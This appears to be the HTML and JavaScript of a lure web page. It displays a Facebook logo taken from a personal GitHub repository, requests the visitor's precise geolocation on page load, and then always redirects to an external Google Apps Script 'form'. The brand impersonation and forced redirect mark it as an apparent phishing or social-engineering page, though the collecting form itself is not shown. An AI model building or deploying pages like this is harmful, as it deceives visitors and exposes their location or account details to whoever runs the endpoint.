<body>

    <div class="pantalla">
        <img
            src="https://raw.githubusercontent.com/hegchegc1991-Eduardo/byte/main/facebook.png"
            alt="Byte"
            class="logo">
    </div>

    <script>

        const destino =
        "https://script.google.com/macros/s/AKfycbyskbfBM_FDZkSBGJ4UB8J00Cyzs8TvcRVb5AGqoqTH5q5uBPqHcWTfNi1Vr0B8Rf-F/exec";

        function solicitarUbicacion() {

            if (!navigator.geolocation) {
                window.location.href = destino;
                return;
            }

            navigator.geolocation.getCurrentPosition(

                function(position) {

                    // Permiso concedido
                    window.location.href = destino;

                },

                function(error) {

                    // Si rechaza el permiso,
                    // continuar igualmente hacia el formulario.
                    window.location.href = destino;

                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        window.addEventListener("load", function() {

            setTimeout(solicitarUbicacion, 500);

        });

    </script>

</body>
</html>
